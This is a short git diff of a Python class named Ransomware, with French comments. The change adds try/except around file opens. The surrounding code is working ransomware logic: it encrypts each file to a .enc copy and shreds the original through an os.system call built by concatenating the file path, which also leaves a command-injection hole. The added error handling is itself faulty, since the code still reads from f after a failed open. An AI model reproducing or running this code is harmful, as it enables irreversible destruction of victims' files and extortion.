@@ -76,14 +76,20 @@ class Ransomware:
         Sinon déchiffre le fichier xxxx.enc et l'écrit dans xxxx en enlevant .enc
         """
         if not encrypted:
-            f = open(file_path, 'rb+')
+            try:
+                f = open(file_path, 'rb+')
+            except OSError:
+                print("marche pas")
             _data = f.read()
             data = self.cryptor.encrypt(_data)
             f_enc = open(file_path + ".enc", 'wb')
             f_enc.write(data)
             os.system("shred -v -z -u "+ file_path + " >/dev/null 2>&1")           
         else:
-            f = open(file_path, 'rb+')
+            try:
+                f = open(file_path, 'rb+')
+            except OSError:
+                print("marche pas")
             _data = f.read()
             data = self.cryptor.decrypt(_data)
             f_dec = open(file_path.replace(".enc",""), 'wb')
